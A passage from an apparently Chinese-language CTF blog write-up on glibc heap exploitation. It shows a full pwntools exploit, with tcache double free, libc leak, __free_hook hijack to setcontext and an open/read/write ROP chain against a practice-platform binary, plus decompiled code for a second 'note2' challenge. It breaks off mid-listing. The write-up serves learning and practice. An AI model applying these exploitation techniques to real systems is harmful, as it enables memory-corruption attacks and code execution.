class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    <span class="comment">#libc =ELF(&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/clr/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27422</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x86.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x86.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEBUG</span>(<span class="params">bps=[],pie =<span class="literal">False</span></span>):</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="comment">#cmd=&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base =<span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#base =int(os.popen(&quot;pmap -x &#123;0&#125; &quot;.format(io.pid)).readlines()[2][:16],16)</span></span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *$rebase(&#123;:#x&#125;)\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if bps !=[]:</span></span><br><span class="line">    <span class="comment">#     cmd +=&#x27;c&#x27;</span></span><br><span class="line">    pwnlib.gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;2&#x27;</span>)    </span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">4</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;context:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x50</span>) <span class="comment"># 用来打tcachebin的堆</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x50</span>) </span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x50</span>) <span class="comment"># 写O</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x50</span>) <span class="comment"># 写R</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x50</span>) <span class="comment"># 写W</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># tcachebin会检查fd和bk,防止double free,这里有UAF直接修改</span></span><br><span class="line">    delete(<span class="number">0</span>) <span class="comment"># double free,填充tcachebin7次,再放一个进fastbin</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;1&#x27;</span>*<span class="number">0x500</span>) <span class="comment"># scanf输入的太大了会调用堆空间来暂存,这种暂存,存了以后会清空fastbin,归类给unsortedbin,然后去smallbin或者largebin</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) <span class="comment"># 上面丢给smallbin了以后,泄露了main_arena的地址</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))</span></span><br><span class="line">libc_base = libc_base-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">176</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + <span class="number">0x7f72e54fc180</span> - <span class="number">0x7f72e54aa000</span> <span class="comment"># 使用setcontext函数,可以实现任意地址跳转</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] </span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 把东西放进fastbin</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(malloc_hook + <span class="number">0x40</span>)) <span class="comment"># UAF,泄露main_arena里面的一个堆地址</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x50</span>) <span class="comment"># 取ptr0(在tcachebin里)</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x50</span>) <span class="comment"># 取malloc_hook+0x40的地址</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>) <span class="comment"># 泄露heap地址</span></span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;heap_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 填充刚刚从tcachebin里面拿出来的两个</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook)) <span class="comment"># 老样子,利用ptr0</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x50</span>) <span class="comment"># 取出free_hook</span></span><br><span class="line">edit(<span class="number">8</span>, p64(setcontext + <span class="number">53</span>)) <span class="comment"># 修改为可利用的地址,注意这里打free_hook是为了利用free_hook的参数</span></span><br><span class="line"></span><br><span class="line">open_libc = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_libc = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_libc = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x00000000000215bf</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000023eea</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">ret = libc_base + <span class="number">0x00000000000008aa</span></span><br><span class="line">chunk1 = heap_base + <span class="number">0x10</span> + <span class="number">0x60</span></span><br><span class="line">chunk2 = chunk1 + <span class="number">0x60</span></span><br><span class="line">chunk3 = chunk2 + <span class="number">0x60</span></span><br><span class="line">pop_4 = libc_base + <span class="number">0x0000000000021aa1</span></span><br><span class="line"></span><br><span class="line">file_path = chunk1 + <span class="number">0x40</span> <span class="comment"># 注意一下,./flag是个指针</span></span><br><span class="line">flag_size = <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk1)) <span class="comment"># 从这里开始布局</span></span><br><span class="line">payload = p64(pop_rdi) + p64(file_path) <span class="comment"># open(file, 0, 0)</span></span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_libc) + p64(pop_4) <span class="comment"># 注意这个pop_4,为了跳过剩下的地址,和下一个堆的presize和size</span></span><br><span class="line">payload += <span class="string">&#x27;./flag\x00&#x27;</span> <span class="comment"># 注意file是一个指针,指向./flag所在的地址</span></span><br><span class="line">edit(<span class="number">1</span>, payload) <span class="comment"># 1是最开始的时候布置的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk2))</span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">3</span>) <span class="comment"># read(3, file, size)</span></span><br><span class="line">payload += p64(pop_rsi) + p64(file_path)</span><br><span class="line">payload += p64(pop_rdx) + p64(flag_size)</span><br><span class="line">payload += p64(read_libc) + p64(pop_4)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk3))</span><br><span class="line">payload = p64(ret) + p64(pop_rdi) + p64(<span class="number">1</span>) <span class="comment"># write(1, file, size)</span></span><br><span class="line">payload += p64(pop_rsi) + p64(file_path)</span><br><span class="line">payload += p64(pop_rdx) + p64(flag_size)</span><br><span class="line">payload += p64(write_libc)</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># DEBUG([0xF49], True)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">8</span> <span class="comment"># 这里布置setcontext使用的rdi的偏移</span></span><br><span class="line">payload += p64(chunk1) <span class="comment"># 这个传给rsp</span></span><br><span class="line">payload += p64(ret) <span class="comment"># 这个传给rcx</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># delete出发free_hook</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="scanf对于堆的利用"><a href="#scanf对于堆的利用" class="headerlink" title="scanf对于堆的利用"></a>scanf对于堆的利用</h4><p>如果使用scanf输入,当输入的东西很多的时候,会使用堆空间来暂存,在存完了以后,会把fastbin里面的东西,清空,给unsortedbin,然后把unsortedbin里面的东西给smallbin或者largebin</p>
<h4 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/35i 0x7fac50983180</span><br><span class="line">   0x7fac50983180 &lt;setcontext&gt;:	push   rdi</span><br><span class="line">   0x7fac50983181 &lt;setcontext+1&gt;:	lea    rsi,[rdi+0x128]</span><br><span class="line">   0x7fac50983188 &lt;setcontext+8&gt;:	xor    edx,edx</span><br><span class="line">   0x7fac5098318a &lt;setcontext+10&gt;:	mov    edi,0x2</span><br><span class="line">   0x7fac5098318f &lt;setcontext+15&gt;:	mov    r10d,0x8</span><br><span class="line">   0x7fac50983195 &lt;setcontext+21&gt;:	mov    eax,0xe</span><br><span class="line">   0x7fac5098319a &lt;setcontext+26&gt;:	syscall </span><br><span class="line">   0x7fac5098319c &lt;setcontext+28&gt;:	pop    rdi</span><br><span class="line">   0x7fac5098319d &lt;setcontext+29&gt;:	cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x7fac509831a3 &lt;setcontext+35&gt;:	jae    0x7fac50983200 &lt;setcontext+128&gt;</span><br><span class="line">   0x7fac509831a5 &lt;setcontext+37&gt;:	mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class="line">   0x7fac509831ac &lt;setcontext+44&gt;:	fldenv [rcx]  # 这里会一直卡住,所以我用的时候跳转到+53的地方</span><br><span class="line">   0x7fac509831ae &lt;setcontext+46&gt;:	ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class="line">   0x7fac509831b5 &lt;setcontext+53&gt;:	mov    rsp,QWORD PTR [rdi+0xa0] # 注意这里调整了rsp</span><br><span class="line">   0x7fac509831bc &lt;setcontext+60&gt;:	mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">   0x7fac509831c3 &lt;setcontext+67&gt;:	mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">   0x7fac509831c7 &lt;setcontext+71&gt;:	mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x7fac509831cb &lt;setcontext+75&gt;:	mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">   0x7fac509831cf &lt;setcontext+79&gt;:	mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">   0x7fac509831d3 &lt;setcontext+83&gt;:	mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">   0x7fac509831d7 &lt;setcontext+87&gt;:	mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">   0x7fac509831de &lt;setcontext+94&gt;:	push   rcx # 注意这里push了rcx</span><br><span class="line">   0x7fac509831df &lt;setcontext+95&gt;:	mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">   0x7fac509831e3 &lt;setcontext+99&gt;:	mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">   0x7fac509831ea &lt;setcontext+106&gt;:	mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">   0x7fac509831f1 &lt;setcontext+113&gt;:	mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x7fac509831f5 &lt;setcontext+117&gt;:	mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">   0x7fac509831f9 &lt;setcontext+121&gt;:	mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">   0x7fac509831fd &lt;setcontext+125&gt;:	xor    eax,eax</span><br><span class="line">   0x7fac509831ff &lt;setcontext+127&gt;:	ret    # 注意这里ret了,相当于执行rcx指向代码</span><br><span class="line">   0x7fac50983200 &lt;setcontext+128&gt;:	mov    rcx,QWORD PTR [rip+0x398c61]        </span><br><span class="line">   0x7fac50983207 &lt;setcontext+135&gt;:	neg    eax</span><br><span class="line">   0x7fac50983209 &lt;setcontext+137&gt;:	mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   0x7fac5098320c &lt;setcontext+140&gt;:	or     rax,0xffffffffffffffff</span><br><span class="line">   0x7fac50983210 &lt;setcontext+144&gt;:	ret   </span><br></pre></td></tr></table></figure>

<p>这里在使用的时候,先把目标地址给rsp,然后在rcx里面写ret的地址,可以跳转到目标地址</p>
<p>另外可以看到,setcontext的值都是按照rdi取偏移的,也就是第一个参数,这里可以打__free_hook,这样free的第一个参数是一个堆的地址,只要我们事先在堆里面放好东西,free的时候调用free_hook,就可以直接跳转到目标地址,setcontext,然后rdi就是我们free的地址</p>
<h3 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h3><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/glibc/x64/2.23/lib/libc-2.23.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>这里可以修改got表,而且没有开pie</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  read_num((__int64)&amp;name, <span class="number">0x40</span>LL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your address:&quot;</span>);</span><br><span class="line">  read_num((__int64)&amp;address, <span class="number">0x60</span>LL, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        del();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>菜单堆</p>
<p>add</p>
<h4 id="unsigned-int-0-1导致的无限制输入堆溢出"><a href="#unsigned-int-0-1导致的无限制输入堆溢出" class="headerlink" title="(unsigned int) 0 - 1导致的无限制输入堆溢出"></a>(unsigned int) 0 - 1导致的无限制输入堆溢出</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *size_4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">list</span> &gt; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;note lists are full&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:(less than 128)&quot;</span>);</span><br><span class="line">  size = input();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x80</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too long&quot;</span>);</span><br><span class="line">  size_4 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the note content:&quot;</span>);</span><br><span class="line">  read_num((__int64)size_4, size, <span class="number">10</span>);</span><br><span class="line">  filter(size_4);</span><br><span class="line">  *(&amp;ptr + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">list</span>) = size_4;</span><br><span class="line">  size_list[<span class="built_in">list</span>] = size;</span><br><span class="line">  v1 = <span class="built_in">list</span>++;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;note add success, the id is %d\n&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里传入的size是一个unsigned int,再read_num函数中,取了size-1,也就是当size==0的时候,size-1将会是655</p>
<p>readnum</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">read_num</span><span class="params">(__int64 ptr, __int64 len, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; len - <span class="number">1</span> &gt; i; ++i ) <span class="comment">// 注意这里的len-1</span></span><br><span class="line">  &#123;</span><br><span 